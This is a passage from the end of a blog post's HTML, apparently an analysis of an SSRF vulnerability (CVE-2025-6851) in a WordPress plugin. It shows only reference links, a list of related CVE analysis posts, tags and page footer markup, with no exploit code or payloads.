    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><a href="https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html"target="_blank" rel="external nofollow noopener noreferrer">SSRF (Server Side Request Forgery) — Hacktrick</a></p>
<p><a href="https://patchstack.com/database/wordpress/plugin/broken-link-notifier/vulnerability/wordpress-broken-link-notifier-plugin-1-3-0-unauthenticated-server-side-request-forgery-vulnerability"target="_blank" rel="external nofollow noopener noreferrer"> WordPress Broken Link Notifier Plugin &lt;= 1.3.0 is vulnerable to Server Side Request Forgery (SSRF) </a></p></div><hr class="awesome-hr" />
    <h2 id="see-also">Related Content</h2>
    <ul><li>
          <a href="/posts/2025-11-02-cve-2025-1043/" title="CVE-2025-1043 Analysis &amp; POC">CVE-2025-1043 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-11-01-cve-2025-52713/" title="CVE-2025-52713 Analysis &amp; POC">CVE-2025-52713 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-10-31-cve-2025-60161/" title="CVE-2025-60161 Analysis &amp; POC">CVE-2025-60161 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-10-30-cve-2025-11128/" title="CVE-2025-11128 Analysis &amp; POC">CVE-2025-11128 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-10-29-cve-2025-12136/" title="CVE-2025-12136 Analysis &amp; POC">CVE-2025-12136 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-10-27-cve-2025-10861/" title="CVE-2025-10861 Analysis &amp; POC">CVE-2025-10861 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-10-23-cve-2023-36679/" title="CVE-2023-36679 Analysis &amp; POC">CVE-2023-36679 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-10-22-cve-2025-11361/" title="CVE-2025-11361 Analysis &amp; POC">CVE-2025-11361 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-10-21-cve-2025-32141/" title="CVE-2025-32141 Analysis &amp; POC">CVE-2025-32141 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-10-20-cve-2025-52716/" title="CVE-2025-52716 Analysis &amp; POC">CVE-2025-52716 Analysis &amp; POC</a></li></ul><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod"><span title="Updated on 2025-10-27 21:42:17">Updated on 2025-10-27&nbsp;<a class="git-hash" href="https://github.com/w41bu1/w41bu1.github.io/commit/610f3a91de2e5099c53211d8ee93aa7596c0f023" rel="external nofollow noopener noreferrer" target="_blank" title="Add post 2025-10-28-CVE-2025-6851&#10&#10Commit: 610f3a91de2e5099c53211d8ee93aa7596c0f023 [610f3a9]&#10Author: w41bu1&#10Date: 2025-10-27 21:42:17"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i>610f3a9</a></span>
      </div><div class="post-info-license">
            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
          </div></div><div class="post-info-line">
        <div class="post-info-md"><span><a href="/posts/2025-10-28-cve-2025-6851/index.md" title="Read Markdown" class="link-to-markdown">Read Markdown</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts/2025-10-28-CVE-2025-6851/index.en.md?plain=1" title="View source"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-source">View source</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/edit/main/content/posts/2025-10-28-CVE-2025-6851/index.en.md" title="Edit this page"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-edit">Edit this page</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/issues/new?title=[BUG]%20CVE-2025-6851&#43;Analysis&#43;%26&#43;POC&amp;body=%7cField%7cValue%7c%0A%7c-%7c-%7c%0A%7cTitle%7cCVE-2025-6851&#43;Analysis&#43;%26&#43;POC%7c%0A%7cURL%7chttp://localhost:1313/posts/2025-10-28-cve-2025-6851/%7c%0A%7cFilename%7chttps://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts/2025-10-28-CVE-2025-6851/index.en.md?plain=1%7c" title="Report issue"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-report">Report issue</a></span><span><a href="vscode://file//home/w41bu1/Desktop/w41bu1.github.io/content/posts/2025-10-28-CVE-2025-6851/index.en.md" title="Open in editor"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-vscode">Open in editor</a></span></div>
        <div class="post-info-share">
          <span><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="http://localhost:1313/posts/2025-10-28-cve-2025-6851/" data-title="CVE-2025-6851 Analysis &amp; POC" data-hashtags="analyst,plugin,ssrf"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/2025-10-28-cve-2025-6851/" data-hashtag="analyst"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/posts/2025-10-28-cve-2025-6851/"><i class="fa-brands fa-linkedin fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/posts/2025-10-28-cve-2025-6851/" data-title="CVE-2025-6851 Analysis &amp; POC"><i class="fa-brands fa-hacker-news fa-fw" aria-hidden="true"></i></a>
  </span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/analyst/" class="post-tag" title="Tags - Analyst">Analyst</a><a href="/tags/plugin/" class="post-tag" title="Tags - Plugin">Plugin</a><a href="/tags/ssrf/" class="post-tag" title="Tags - Ssrf">Ssrf</a></section>
    <section><span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
    </section>
  </div><div class="post-nav"><a href="/posts/2025-10-27-cve-2025-10861/" class="post-nav-item" rel="prev" title="CVE-2025-10861 Analysis &amp; POC"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>CVE-2025-10861 Analysis &amp; POC</a><a href="/posts/2025-10-29-cve-2025-12136/" class="post-nav-item" rel="next" title="CVE-2025-12136 Analysis &amp; POC">CVE-2025-12136 Analysis &amp; POC<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.152.2"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.4.0-alpha.2-20251023040336-063af2cd"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">
              <a href="github.com/w41bu1">Bui Van Y</a></span></div><div class="footer-line statistics"></div><div class="footer-line visitor">
          <span id="busuanzi_container_site_uv" title='Total visitors'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Total visits'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
        </div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
        </div></div><div id="mask"></div><noscript>
    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/lightgallery/lightgallery.min.js" defer></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js" defer></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script src="/posts/2025-10-28-cve-2025-6851/config/page.js" defer></script><script src="/js/lib/mermaid.js" type="module"></script><script src="/js/theme.min.js" defer></script></body>
</html>
